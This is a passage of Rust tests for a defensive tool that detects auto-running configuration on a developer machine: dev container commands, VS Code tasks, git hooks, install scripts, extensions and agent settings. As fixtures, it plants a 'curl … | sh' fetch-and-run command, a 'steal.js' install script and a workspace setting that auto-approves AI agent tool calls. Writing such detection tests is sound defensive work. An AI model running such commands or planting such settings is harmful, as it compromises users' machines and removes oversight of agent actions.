        [pair("autorun.folder-open", "~/dev/evil/.vscode/tasks.json")]
    );
    e.seen();
    std::fs::remove_file(evil.join(".vscode/tasks.json")).unwrap();
    put(&evil.join(".vscode/tasks.json"), ON_OPEN);
    e.run();
    assert_eq!(
        e.found(),
        [pair("autorun.folder-open", "~/dev/evil/.vscode/tasks.json")]
    );
}

#[test]
fn a_file_that_cannot_be_read_hides_nothing_added_to_another_file_of_its_project() {
    // One project's dev container file is a link that leads nowhere, for good. A dev container
    // file added beside it in the same project is found, and so is a second addition to it a
    // week later.
    let e = Estate::new("failing-neighbour");
    let shop = e.checkout("dev/shop");
    link(
        "../../shared/devcontainer.json",
        &shop.join(".devcontainer/devcontainer.json"),
    );
    let blog = e.checkout("dev/blog");
    put(&blog.join(".devcontainer.json"), r#"{"name": "blog"}"#);
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    put(
        &shop.join(".devcontainer.json"),
        r#"{"initializeCommand": "curl -s https://invented.example/x | sh"}"#,
    );
    e.run();
    assert_eq!(
        e.found(),
        [pair(
            "autorun.editor-open",
            "~/dev/shop/.devcontainer.json#/initializeCommand"
        )]
    );
    e.seen();
    put(
        &shop.join(".devcontainer.json"),
        r#"{"initializeCommand": "curl -s https://invented.example/x | sh", "postStartCommand": "sh .x"}"#,
    );
    e.run();
    assert_eq!(
        e.found(),
        [pair(
            "autorun.editor-open",
            "~/dev/shop/.devcontainer.json#/postStartCommand"
        )]
    );
}

#[test]
fn a_new_file_beside_one_that_cannot_be_read_in_a_clone_made_after_the_first_check_is_found() {
    // A clone keeps a workspace file that is a link to nowhere; a later pull adds another
    // workspace file beside it. The folder was listed, and the new file was not in it.
    let e = Estate::new("clone-dangling-workspace");
    e.checkout("dev/old");
    e.run();
    let evil = e.checkout("dev/evil");
    link(
        "missing/team.code-workspace",
        &evil.join("team.code-workspace"),
    );
    e.run();
    assert_eq!(
        e.found(),
        [pair(
            "autorun.editor-open",
            "~/dev/evil/team.code-workspace"
        )]
    );
    e.seen();
    put(
        &evil.join("dev.code-workspace"),
        r#"{"folders": [{"path": "."}], "settings": {"chat.tools.autoApprove": true}}"#,
    );
    e.run();
    assert_eq!(
        e.found(),
        [
            pair(
                "autorun.editor-open",
                "~/dev/evil/dev.code-workspace#/folders"
            ),
            pair(
                "autorun.editor-open",
                "~/dev/evil/dev.code-workspace#/settings/chat.tools.autoApprove"
            ),
        ]
    );
}

#[test]
fn an_extension_that_cannot_be_looked_into_hides_no_extension_installed_later() {
    // One editor extension is a link into ~/Documents, which is never looked into. The folder of
    // extensions was still listed: an extension installed after that is found.
    let e = Estate::new("guarded-extension");
    let ext = e.home().join(".vscode/extensions");
    std::fs::create_dir_all(ext.join("ms-python.python-2024.1.0")).unwrap();
    std::fs::create_dir_all(e.home().join("Documents/my-ext")).unwrap();
    link(
        e.home().join("Documents/my-ext").to_str().unwrap(),
        &ext.join("invented.my-ext-0.0.1"),
    );
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    std::fs::create_dir_all(ext.join("invented.stealer-1.0.0")).unwrap();
    e.run();
    assert_eq!(
        e.found(),
        [pair(
            "autorun.editor-extension",
            "~/.vscode/extensions/invented.stealer"
        )]
    );
}

#[test]
fn a_failure_inside_a_project_kept_in_another_hides_nothing_added_to_the_outer_project() {
    // An agent worked in a project kept inside another, whose own package file is a link to
    // nowhere. A script added to the outer project is found.
    let e = Estate::new("nested-failure");
    let shop = e.checkout("dev/shop");
    package(&shop, "\"postinstall\": \"node setup.js\"");
    let inner = shop.join("tools/gen");
    put(&inner.join(".git/HEAD"), "ref: refs/heads/main\n");
    link("../../missing/package.json", &inner.join("package.json"));
    session(&e, "gen", &inner);
    e.run_with(&e.home(), &e.0.join("sessions"));
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    package(
        &shop,
        "\"postinstall\": \"node setup.js\", \"preinstall\": \"node x.js\"",
    );
    e.run_with(&e.home(), &e.0.join("sessions"));
    assert_eq!(
        e.found(),
        [pair(
            "autorun.package-install",
            "~/dev/shop/package.json#/scripts/preinstall"
        )]
    );
}

#[test]
fn a_run_pointed_at_a_folder_the_home_walk_never_enters_tells_its_projects_once_and_raises_nothing()
{
    // The documented way to read projects in ~/Documents is a run pointed there. Its projects
    // were always there and were never read: no rule raises them, and one item tells which
    // places were read for the first time and how many things each holds that run by
    // themselves. Nothing about them is silent.
    let e = Estate::new("pointed-documents");
    let shop = e.checkout("dev/shop");
    package(&shop, "\"postinstall\": \"node setup.js\"");
    let app = e.checkout("Documents/code/app");
    package(&app, "\"postinstall\": \"node setup.js\"");
    agent(&app, HOOK);
    e.run();
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    e.run_in(&e.home().join("Documents"));
    assert_eq!(e.found(), [pair(FIRST_READ, "mac")]);
    assert_eq!(e.told(), ["checkout:machine:mac/Documents/code/app (2)"]);
    let one = e.contract(&["findings"]);
    let item = &one["findings"][0];
    assert_eq!(item["finding"]["severity"], "informational", "{item}");
}

#[test]
fn a_project_deeper_than_the_walk_goes_is_told_once_when_a_run_reaches_it_and_raises_nothing() {
    // The walk of the home folder lists five levels; a project at the sixth is read for the
    // first time by a run pointed above it.
    let e = Estate::new("deep");
    let deep = e.checkout("src/clients/acme/apps/web/frontend");
    package(&deep, "\"postinstall\": \"node setup.js\"");
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    e.run_in(&e.home().join("src"));
    assert_eq!(e.found(), [pair(FIRST_READ, "mac")]);
    assert_eq!(
        e.told(),
        ["checkout:machine:mac/src/clients/acme/apps/web/frontend (1)"]
    );
}

#[test]
fn a_first_agent_session_in_an_old_project_outside_the_walk_is_told_once_and_raises_nothing() {
    // A week after the first check the owner starts an agent, for the first time, in an old
    // project in a hidden folder the walk never lists. Sessions name folders; they cannot show
    // that the project is new.
    let e = Estate::new("first-session");
    let other = e.checkout("dev/shop");
    session(&e, "shop", &other);
    let old = e.home().join(".config/tool");
    put(&old.join(".git/HEAD"), "ref: refs/heads/main\n");
    package(&old, "\"preinstall\": \"node x.js\"");
    agent(&old, HOOK);
    e.run_with(&e.home(), &e.0.join("sessions"));
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    session(&e, "tool", &old);
    e.run_with(&e.home(), &e.0.join("sessions"));
    assert_eq!(e.found(), [pair(FIRST_READ, "mac")]);
    assert_eq!(e.told(), ["checkout:machine:mac/.config/tool (2)"]);
}

#[test]
fn a_folder_that_could_not_be_listed_on_the_first_day_is_told_once_when_it_can_be_and_raises_nothing()
 {
    let e = Estate::new("unlisted-day-one");
    let old = e.checkout("archive/old");
    package(&old, "\"postinstall\": \"node setup.js\"");
    {
        let _l = Locked::new(e.home().join("archive"));
        e.run();
    }
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    e.run();
    assert_eq!(e.found(), [pair(FIRST_READ, "mac")]);
    assert_eq!(e.told(), ["checkout:machine:mac/archive/old (1)"]);
}

/// The page of changes, as `immunity view` writes it.
fn changes_page(e: &Estate) -> String {
    let out = Command::new(env!("CARGO_BIN_EXE_immunity"))
        .args(["view", "--no-open", "--store"])
        .arg(e.store())
        .output()
        .unwrap();
    let pages = String::from_utf8(out.stdout).unwrap();
    let path = pages
        .lines()
        .find(|p| p.ends_with("changes.html"))
        .unwrap()
        .to_string();
    std::fs::read_to_string(path).unwrap()
}

#[test]
fn the_changes_page_the_status_and_the_journal_count_a_first_reading_alike() {
    // On the first day everything found is the baseline: the page says so and counts nothing
    // as added, as the status does. A later first reading is shown as such on the page, and
    // the counts of the page are the status's.
    let e = Estate::new("page-agrees");
    let shop = e.checkout("dev/shop");
    package(&shop, "\"postinstall\": \"node setup.js\"");
    agent(&shop, HOOK);
    put(&e.home().join(".zshrc"), "export A=1\n");
    put(
        &e.home()
            .join("Library/LaunchAgents/com.invented.sync.plist"),
        "<plist><dict/></plist>\n",
    );
    let app = e.checkout("Documents/code/app");
    package(&app, "\"postinstall\": \"node setup.js\"");
    e.run();
    assert!(e.status()["since_previous_run"].is_null());
    let page = changes_page(&e);
    assert!(page.contains("+0 added, 0 changed, 0 removed, "), "{page}");
    assert!(!page.contains("<td>added</td>"), "{page}");
    e.run_in(&e.home().join("Documents"));
    let since = &e.status()["last_finished_run"]["since_previous_run"];
    // The project, its file and the ways it holds are a first reading, never an addition.
    assert_eq!(since["added"], 0, "{since}");
    let page = changes_page(&e);
    let counts = format!(
        "+{} added, {} changed, {} removed, 2 things read for the first time and kept as the baseline",
        since["added"], since["changed"], since["removed"]
    );
    assert!(page.contains(&counts), "{counts}\n{page}");
    assert!(page.contains("<td>first reading</td>"), "{page}");
    // The journal marks it, and the item rests on the place it names.
    assert_eq!(
        e.rows(
            "SELECT CAST(COUNT(*) AS TEXT) FROM journal
             WHERE text = 'read for the first time' AND predicate = 'watched_as'"
        ),
        ["1"]
    );
    assert_eq!(e.told(), ["checkout:machine:mac/Documents/code/app (1)"]);
}

#[test]
fn a_watched_file_read_before_that_cannot_be_read_now_is_a_finding_with_why_and_a_change_meanwhile_is_found_after()
 {
    // Someone who wants to change a watched file unseen would break its reading first. Losing
    // sight of a file read before is a finding of its kind, with why, and the file stays in
    // coverage as not read; when it reads again, what changed meanwhile is a change.
    let e = Estate::new("lose-sight-file");
    let zshrc = e.home().join(".zshrc");
    put(&zshrc, "export A=1\n");
    e.run();
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&zshrc, std::fs::Permissions::from_mode(0o000)).unwrap();
        e.run();
        std::fs::set_permissions(&zshrc, std::fs::Permissions::from_mode(0o644)).unwrap();
    }
    assert_eq!(e.found(), [pair("watched.shell-profile", "~/.zshrc")]);
    assert_eq!(
        e.rows(
            "SELECT new_value FROM journal WHERE entry = 'not_read'
               AND subject = 'file:machine:mac/.zshrc'"
        ),
        ["Permission denied (os error 13)"]
    );
    e.seen();
    put(&zshrc, "export A=2\n");
    e.run();
    assert_eq!(e.found(), [pair("watched.shell-profile", "~/.zshrc")]);
    assert_eq!(
        e.rows(
            "SELECT entry FROM journal WHERE subject = 'file:machine:mac/.zshrc'
               AND predicate = 'has_content' ORDER BY seq DESC LIMIT 1"
        ),
        ["changed"]
    );
}

#[test]
fn a_project_file_read_before_that_cannot_be_read_now_is_a_finding_with_why_and_a_change_meanwhile_is_found_after()
 {
    let e = Estate::new("lose-sight-project");
    let shop = e.checkout("dev/shop");
    package(&shop, "\"postinstall\": \"node setup.js\"");
    let pnpmfile = shop.join(".pnpmfile.cjs");
    let hook = "module.exports = {}\n";
    put(&pnpmfile, hook);
    e.run();
    std::fs::write(&pnpmfile, vec![b' '; 1024 * 1024 + 1]).unwrap();
    let file = shop.join("package.json");
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&file, std::fs::Permissions::from_mode(0o000)).unwrap();
        e.run();
        std::fs::set_permissions(&file, std::fs::Permissions::from_mode(0o644)).unwrap();
    }
    assert_eq!(
        e.found(),
        [
            pair("autorun.package-install", "~/dev/shop/.pnpmfile.cjs"),
            pair("autorun.package-install", "~/dev/shop/package.json"),
        ]
    );
    assert_eq!(
        e.coverage(PNPM_KIND),
        "none|could not be read: dev/shop/.pnpmfile.cjs (over the size cap of 1024 KiB)"
    );
    assert_eq!(
        e.rows(
            "SELECT object FROM assertion WHERE layer = 'live' AND predicate = 'has_content'
               AND subject LIKE '%dev/shop/.pnpmfile.cjs'"
        ),
        [format!("sha256:{}", sha256_of(hook))]
    );
    assert!(
        e.rows("SELECT new_value FROM journal WHERE entry = 'not_read'")
            .iter()
            .any(|why| why.contains("Permission denied")),
    );
    // What it held is kept while it cannot be read: the script is not gone.
    assert!(
        !e.rows(
            "SELECT subject FROM assertion WHERE layer = 'live'
               AND subject LIKE '%dev/shop/package.json#/scripts/postinstall'"
        )
        .is_empty()
    );
    e.seen();
    put(&pnpmfile, "module.exports = { hooks: {} }\n");
    package(&shop, "\"postinstall\": \"node steal.js\"");
    e.run();
    assert_eq!(
        e.found(),
        [
            pair("autorun.package-install", "~/dev/shop/.pnpmfile.cjs"),
            pair(
                "autorun.package-install",
                "~/dev/shop/package.json#/scripts/postinstall"
            ),
        ]
    );
}

#[test]
fn a_place_that_could_not_be_read_is_never_told_as_a_change_that_was_seen() {
    // A watched place read before that cannot be read now stays a finding at its rule's level,
    // since it can hide a change. Nothing was seen to change, so its words say that it could
    // not be read, never that it was added, changed or removed: for a watched file and for a
    // project's file alike, in the list and in the finding. A finding that saw a change before
    // it lost sight of the place keeps the rule's words, since that change was seen.
    let e = Estate::new("unread-words");
    let zshrc = e.home().join(".zshrc");
    put(&zshrc, "export A=1\n");
    let shop = e.checkout("dev/shop");
    package(&shop, "\"postinstall\": \"node setup.js\"");
    let file = shop.join("package.json");
    e.run();
    let shut = |paths: &[&Path]| {
        use std::os::unix::fs::PermissionsExt;
        for p in paths {
            std::fs::set_permissions(p, std::fs::Permissions::from_mode(0o000)).unwrap();
        }
        e.run();
        for p in paths {
            std::fs::set_permissions(p, std::fs::Permissions::from_mode(0o644)).unwrap();
        }
    };
    // The open finding of a rule: its words in the list and whole, and its severity.
    let said = |rule: &str| -> (String, String, String) {
        let listed = e.contract(&["findings"]);
        let item = listed["findings"]
            .as_array()
            .unwrap()
            .iter()
            .find(|f| f["finding"]["rule"] == rule && f["finding"]["state"] == "open")
            .unwrap_or_else(|| panic!("no open {rule}: {listed:#}"))
            .clone();
        let one = e.contract(&["finding", item["finding"]["id"].as_str().unwrap()]);
        assert_eq!(item["title"], one["title"], "{item:#}\n{one:#}");
        let s = |v: &serde_json::Value| v.as_str().unwrap_or_default().to_string();
        (
            s(&one["title"]),
            s(&one["meaning"]),
            s(&one["finding"]["severity"]),
        )
    };
    let level = |rule: &str| {
        let rules = e.contract(&["rules"]);
        let found = rules["catalogue"]["rules"]
            .as_array()
            .unwrap()
            .iter()
            .find(|r| r["id"] == rule)
            .unwrap_or_else(|| panic!("no rule {rule}"))
            .clone();
        let s = |k: &str| found[k].as_str().unwrap().to_string();
        (s("severity"), s("title"))
    };
    shut(&[&zshrc, &file]);
    for rule in ["watched.shell-profile", "autorun.package-install"] {
        let (title, meaning, severity) = said(rule);
        assert!(
            title.contains("could not read") && title.contains("not known whether"),
            "{rule}: {title}"
        );
        let (rule_severity, rule_title) = level(rule);
        assert_ne!(title, rule_title);
        assert!(meaning.contains("cannot read it now"), "{meaning}");
        assert_eq!(severity, rule_severity, "{rule}");
    }
    // A suspicious verdict about such a finding names it in the same words.
    let listed = e.contract(&["findings"]);
    let profile = listed["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|f| f["finding"]["rule"] == "watched.shell-profile")
        .unwrap()
        .clone();
    let verdict = serde_json::json!({
        "format": 1,
        "store_id": listed["store_id"],
        "finding": { "id": profile["finding"]["id"] },
        "kind": "suspicious",
        "severity": "low",
        "confidence": "low",
        "reason_text": "invented: a reason",
        "case_text": "case-1",
    });
    let mut child = Command::new(env!("CARGO_BIN_EXE_immunity"))
        .args(["verdict", "--json", "--store"])
        .arg(e.store())
        .arg("--system-root")
        .arg(e.0.join("system"))
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .spawn()
        .unwrap();
    {
        use std::io::Write;
        let mut stdin = child.stdin.take().unwrap();
        stdin.write_all(verdict.to_string().as_bytes()).unwrap();
    }
    assert!(child.wait_with_output().unwrap().status.success());
    let status = e.contract(&["status"]);
    let judged = status["needs_a_look"]["items"]
        .as_array()
        .unwrap()
        .iter()
        .find(|l| l["finding"]["finding"]["rule"] == "verdict.suspicious")
        .unwrap_or_else(|| panic!("{status:#}"))
        .clone();
    assert_eq!(judged["value_text"], profile["title"], "{judged:#}");
    // A change seen first, then the place lost sight of, in one open finding.
    e.seen();
    put(&zshrc, "export A=2\n");
    e.run();
    shut(&[&zshrc]);
    assert_eq!(
        said("watched.shell-profile").0,
        "A file your terminal runs every time it starts was added, changed or removed."
    );
}

#[test]
fn what_is_removed_from_a_place_read_in_full_is_gone_while_another_place_of_its_kind_cannot_be_read()
 {
    // The reading of a kind is partial when one of its places cannot be read. What is gone
    // from a place that was read in full is still gone, and an autostart item removed is a
    // finding, as an install script removed from a project is journaled as removed.
    let e = Estate::new("removed-while-partial");
    let agents = e.home().join("Library/LaunchAgents");
    put(
        &agents.join("com.invented.sync.plist"),
        "<plist><dict/></plist>\n",
    );
    let system = e.0.join("system/Library/LaunchAgents");
    put(
        &system.join("com.invented.helper.plist"),
        "<plist><dict/></plist>\n",
    );
    let shop = e.checkout("dev/shop");
    package(&shop, "\"postinstall\": \"node setup.js\"");
    let blog = e.checkout("dev/blog");
    package(&blog, "\"postinstall\": \"node setup.js\"");
    e.run();
    let _locked = Locked::new(agents.clone());
    let blog_file = blog.join("package.json");
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&blog_file, std::fs::Permissions::from_mode(0o000)).unwrap();
    }
    std::fs::remove_file(system.join("com.invented.helper.plist")).unwrap();
    package(&shop, "\"test\": \"jest\"");
    let report = e.run();
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&blog_file, std::fs::Permissions::from_mode(0o644)).unwrap();
    }
    assert!(
        e.coverage(AUTOSTART_KIND).starts_with("partial|"),
        "{}",
        e.coverage(AUTOSTART_KIND)
    );
    assert!(
        e.found().contains(&pair(
            "watched.autostart",
            "/Library/LaunchAgents/com.invented.helper.plist"
        )),
        "{:?}",
        e.found()
    );
    let removed = e.rows(
        "SELECT subject FROM journal WHERE entry = 'removed' AND predicate = 'watched_as'
           AND run_id = (SELECT run_id FROM journal WHERE entry = 'report'
                         ORDER BY seq DESC LIMIT 1)",
    );
    assert!(
        removed
            .iter()
            .any(|s| s.ends_with("dev/shop/package.json#/scripts/postinstall")),
        "{removed:?}\n{report}"
    );
}

#[test]
fn after_the_first_check_nothing_present_and_unrecorded_is_ever_silent() {
    // No false calm by construction: once the store has had its first check, a place read
    // for the first time is told, never taken silently, whatever brought it into reach.
    let e = Estate::new("never-silent");
    let shop = e.checkout("dev/shop");
    package(&shop, "\"postinstall\": \"node setup.js\"");
    let app = e.checkout("Documents/code/app");
    package(&app, "\"postinstall\": \"node setup.js\"");
    let archived = e.checkout("archive/old");
    package(&archived, "\"postinstall\": \"node setup.js\"");
    let agents = e.home().join("Library/LaunchAgents");
    put(
        &agents.join("com.invented.sync.plist"),
        "<plist><dict/></plist>\n",
    );
    let hidden = e.home().join(".tools/helper");
    put(&hidden.join(".git/HEAD"), "ref: refs/heads/main\n");
    package(&hidden, "\"preinstall\": \"node x.js\"");
    {
        let _a = Locked::new(e.home().join("archive"));
        let _b = Locked::new(agents.clone());
        e.run();
    }
    let after = e.last_entry();
    e.run();
    e.run_in(&e.home().join("Documents"));
    session(&e, "helper", &hidden);
    e.run_with(&e.home(), &e.0.join("sessions"));
    assert_eq!(e.silent_after(after), 0);
    let mut told = e.told();
    told.sort();
    assert_eq!(
        told,
        [
            "checkout:machine:mac/.tools/helper (1)",
            "checkout:machine:mac/Documents/code/app (1)",
            "checkout:machine:mac/archive/old (1)",
            "file:machine:mac/Library/LaunchAgents (1)",
        ]
    );
}

#[test]
fn a_row_a_newer_version_reads_first_in_a_clone_found_earlier_is_told_once_and_raises_nothing() {
    // A clone made after the first check is found. A later version reads a row the older one
    // did not: what the clone held there could have been there since it arrived, so it is told
    // once, not raised.
    let e = Estate::new("new-row-old-clone");
    e.checkout("dev/old");
    e.run();
    let evil = e.checkout("dev/evil");
    package(&evil, "\"postinstall\": \"node setup.js\"");
    put(
        &evil.join(".devcontainer.json"),
        r#"{"initializeCommand": "sh .x"}"#,
    );
    e.run();
    assert!(
        e.found().contains(&pair(
            "autorun.editor-open",
            "~/dev/evil/.devcontainer.json#/initializeCommand"
        )),
        "{:?}",
        e.found()
    );
    e.seen();
    // As a version that did not read dev container files left the store.
    let db = Connection::open(e.store()).unwrap();
    db.execute_batch(
        "DELETE FROM assertion WHERE kind LIKE '.devcontainer/devcontainer.json%';
         DELETE FROM coverage WHERE kind LIKE '.devcontainer/devcontainer.json%';
         DELETE FROM unit_read WHERE kind LIKE '.devcontainer/devcontainer.json%';",
    )
    .unwrap();
    drop(db);
    e.run();
    assert_eq!(e.rules(), [FIRST_READ], "{:?}", e.findings(false));
    assert_eq!(e.told(), ["checkout:machine:mac/dev/evil (1)"]);
}

#[test]
fn a_file_a_newer_version_could_not_read_at_first_in_a_clone_found_earlier_is_told_once_when_it_reads()
 {
    // The clone was found when it arrived, but the store holds nothing of a row a later
    // version reads, whose file fails at first. When it reads, nothing shows it is new: it is
    // told once, not raised.
    let e = Estate::new("new-row-fails-old-clone");
    e.checkout("dev/old");
    e.run();
    let evil = e.checkout("dev/evil");
    package(&evil, "\"postinstall\": \"node setup.js\"");
    link(
        "missing/devcontainer.json",
        &evil.join(".devcontainer.json"),
    );
    e.run();
    e.seen();
    // As a version that did not read dev container files left the store.
    let db = Connection::open(e.store()).unwrap();
    db.execute_batch(
        "DELETE FROM assertion WHERE kind LIKE '.devcontainer/devcontainer.json%';
         DELETE FROM coverage WHERE kind LIKE '.devcontainer/devcontainer.json%';
         DELETE FROM unit_read WHERE kind LIKE '.devcontainer/devcontainer.json%';",
    )
    .unwrap();
    drop(db);
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    std::fs::remove_file(evil.join(".devcontainer.json")).unwrap();
    put(
        &evil.join(".devcontainer.json"),
        r#"{"initializeCommand": "sh .x"}"#,
    );
    e.run();
    assert_eq!(e.rules(), [FIRST_READ], "{:?}", e.findings(false));
    assert_eq!(e.told(), ["checkout:machine:mac/dev/evil (1)"]);
}

// Something there that cannot be read is judged by the same three cases, and something read
// before is gone only when it is absent. Each of the next tests began as a probe of the
// second review, on full walks of the home folder.

#[test]
fn hooks_read_before_whose_git_folder_became_a_git_file_are_lost_sight_of_and_found() {
    // The git folder moved out of reach, a `.git` file left pointing to it, a hook planted
    // there: git runs it. The hooks read before are not gone; losing sight of them is found.
    let e = Estate::new("git-file-later");
    let shop = e.checkout("dev/shop");
    put(&shop.join(".git/hooks/pre-commit"), "#!/bin/sh\nexit 0\n");
    e.full();
    e.full();
    assert!(e.found().is_empty(), "{:?}", e.found());
    let gitdir = e.home().join(".cache/shop.git");
    std::fs::create_dir_all(gitdir.parent().unwrap()).unwrap();
    std::fs::rename(shop.join(".git"), &gitdir).unwrap();
    put(
        &shop.join(".git"),
        &format!("gitdir: {}\n", gitdir.display()),
    );
    put(&gitdir.join("hooks/post-checkout"), "#!/bin/sh\n");
    e.full();
    assert_eq!(
        e.found(),
        [pair("watched.git-hook", "~/dev/shop/.git/hooks")]
    );
    // Said once while it stays so.
    e.seen();
    e.full();
    assert!(e.found().is_empty(), "{:?}", e.found());
}

#[test]
fn an_autostart_item_new_to_a_folder_listed_before_is_found_while_it_cannot_be_looked_at() {
    let e = Estate::new("unsearchable");
    e.checkout("dev/shop");
    let agents = e.home().join("Library/LaunchAgents");
    std::fs::create_dir_all(&agents).unwrap();
    e.full();
    e.full();
    put(
        &agents.join("com.invented.updater.plist"),
        "<plist><dict/></plist>\n",
    );
    {
        // Listed, but no entry can be looked at.
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&agents, std::fs::Permissions::from_mode(0o644)).unwrap();
        e.full();
        std::fs::set_permissions(&agents, std::fs::Permissions::from_mode(0o755)).unwrap();
    }
    assert_eq!(
        e.found(),
        [pair(
            "watched.autostart",
            "~/Library/LaunchAgents/com.invented.updater.plist"
        )]
    );
    assert!(
        e.rows("SELECT new_value FROM journal WHERE entry = 'not_read'")
            .iter()
            .any(|why| why.contains("Permission denied")),
    );
}

#[test]
fn an_editor_extension_installed_as_a_link_into_a_guarded_folder_is_found() {
    let e = Estate::new("guarded-new-extension");
    e.checkout("dev/shop");
    let ext = e.home().join(".vscode/extensions");
    std::fs::create_dir_all(ext.join("invented.good-1.0.0")).unwrap();
    e.full();
    e.full();
    let real = e.home().join("Documents/x/invented.evil-1.0.0");
    std::fs::create_dir_all(&real).unwrap();
    link(real.to_str().unwrap(), &ext.join("invented.evil-1.0.0"));
    e.full();
    assert_eq!(
        e.found(),
        [pair(
            "autorun.editor-extension",
            "~/.vscode/extensions/invented.evil"
        )]
    );
}

#[test]
fn an_extension_there_since_the_first_check_as_a_link_into_a_guarded_folder_is_not_new_once_it_reads()
 {
    // It was seen at the first check, though not looked into: once it is a folder that can be
    // read, it is read for the first time, never a new extension.
    let e = Estate::new("guarded-then-folder");
    e.checkout("dev/shop");
    let ext = e.home().join(".vscode/extensions");
    let real = e.home().join("Documents/x/invented.linked-1.0.0");
    std::fs::create_dir_all(&real).unwrap();
    link(real.to_str().unwrap(), &ext.join("invented.linked-1.0.0"));
    e.full();
    e.full();
    std::fs::remove_file(ext.join("invented.linked-1.0.0")).unwrap();
    put(&ext.join("invented.linked-1.0.0/package.json"), "{}\n");
    e.full();
    assert!(
        !e.rules().contains(&"autorun.editor-extension".to_string()),
        "{:?}",
        e.found()
    );
}

#[test]
fn a_clone_made_after_the_first_check_is_found_when_its_files_or_hooks_lead_into_a_guarded_folder()
{
    let e = Estate::new("guarded-clone");
    e.checkout("dev/shop");
    e.full();
    e.full();
    let evil = e.checkout("dev/evil");
    let real = e.home().join("Documents/x");
    put(&real.join("tasks.json"), ON_OPEN);
    put(&real.join("settings.json"), HOOK);
    put(&real.join("hooks/post-checkout"), "#!/bin/sh\n");
    link(
        real.join("tasks.json").to_str().unwrap(),
        &evil.join(".vscode/tasks.json"),
    );
    link(
        real.join("settings.json").to_str().unwrap(),
        &evil.join(".claude/settings.json"),
    );
    link(
        real.join("hooks").to_str().unwrap(),
        &evil.join(".git/hooks"),
    );
    e.full();
    assert_eq!(
        e.found(),
        [
            pair("autorun.agent-start", "~/dev/evil/.claude/settings.json"),
            pair("autorun.folder-open", "~/dev/evil/.vscode/tasks.json"),
            pair("watched.git-hook", "~/dev/evil/.git/hooks"),
        ]
    );
    // Found once while it stays so.
    e.seen();
    e.full();
    assert!(e.found().is_empty(), "{:?}", e.found());
}

#[test]
fn a_project_moved_behind_a_link_at_its_old_path_is_not_gone_and_losing_sight_of_it_is_found() {
    let e = Estate::new("moved-behind-link");
    let shop = e.checkout("dev/shop");
    put(&shop.join(".git/hooks/pre-commit"), "#!/bin/sh\nexit 0\n");
    e.full();
    e.full();
    let real = e.home().join(".local/share/shop");
    std::fs::create_dir_all(real.parent().unwrap()).unwrap();
    std::fs::rename(&shop, &real).unwrap();
    link(real.to_str().unwrap(), &shop);
    put(&real.join(".git/hooks/post-checkout"), "#!/bin/sh\n");
    e.full();
    assert_eq!(
        e.found(),
        [pair("watched.git-hook", "~/dev/shop/.git/hooks")]
    );
    assert_eq!(
        e.rows(
            "SELECT entry FROM journal WHERE subject = 'checkout:machine:mac/dev/shop'
               AND predicate = 'located_on' ORDER BY seq"
        ),
        ["added"],
        "the checkout is not journaled as removed"
    );
}

#[test]
fn each_check_with_first_readings_raises_its_own_item_whatever_was_answered_about_an_earlier_one() {
    // The item of one check marked expected, or still open, hides nothing a later check reads
    // for the first time.
    let e = Estate::new("item-per-check");
    e.checkout("dev/shop");
    std::fs::create_dir_all(e.home().join(".cache/pip")).unwrap();
    std::fs::create_dir_all(e.home().join(".config/pip")).unwrap();
    let tools = e.checkout(".tools/helper");
    put(&tools.join(".git/hooks/pre-push"), "#!/bin/sh\nexit 0\n");
    e.full();
    e.full();
    e.run_in(&e.home().join(".tools"));
    assert_eq!(e.told(), ["checkout:machine:mac/.tools/helper (1)"]);
    let first = e.contract(&["findings"])["findings"][0]["finding"]["id"]
        .as_str()
        .unwrap()
        .to_string();
    let whole = e.contract(&["finding", &first]);
    assert_eq!(
        whole["evidence"]["place_changed"].get("presence_only"),
        Some(&serde_json::Value::Null)
    );
    // It is about what was read, counted, and the machine is where that is: in the list, in
    // the finding whole and in what needs a look, each with its kind in a person's words.
    let listed = &e.contract(&["findings"])["findings"][0];
    let look = &e.status()["needs_a_look"]["items"][0]["finding"];
    for f in [listed, &whole, look] {
        assert_eq!(
            (&f["thing"], &f["where_text"], &f["kind_title"]),
            (
                &"1 project".into(),
                &"mac".into(),
                &"Read for the first time".into()
            ),
            "{f:#}"
        );
    }
    // The page's row starts with the same thing and names the kind by the same title.
    let page = e.page("view.html");
    assert!(
        page.contains(
            "<span class=\"fw\">1 project</span><span class=\"fk\">Read for the first time · read for the first time</span>"
        ),
        "{page}"
    );
    let out = Command::new(env!("CARGO_BIN_EXE_immunity"))
        .args(["finding", &first, "--store"])
        .arg(e.store())
        .output()
        .unwrap();
    assert!(out.status.success());
    let text = String::from_utf8(out.stdout).unwrap();
    // The place by the name a person knows it by, never its entity id.
    assert!(
        text.contains("\n    First read   ~/.tools/helper, 1 thing runs by itself\n"),
        "{text}"
    );
    assert!(text.contains("\n  1 project on mac   "), "{text}");
    // The list's row says it too, beside the short title; what needs a look counts the rule.
    let said = |args: &[&str]| {
        let out = Command::new(env!("CARGO_BIN_EXE_immunity"))
            .args(args)
            .arg("--store")
            .arg(e.store())
            .output()
            .unwrap();
        String::from_utf8(out.stdout).unwrap()
    };
    let list = said(&["findings"]);
    assert!(
        list.contains("\n  Places read for the first time   1\n")
            && list
                .lines()
                .any(|l| l.starts_with("    f") && l.contains("  1 project on ")),
        "{list}"
    );
    let status = said(&["status"]);
    assert!(
        status.contains("Places read for the first time"),
        "{status}"
    );
    let out = Command::new(env!("CARGO_BIN_EXE_immunity"))
        .args([
            "finding",
            &first,
            "expected",
            "--reason",
            "my own tools folder",
            "--store",
        ])
        .arg(e.store())
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
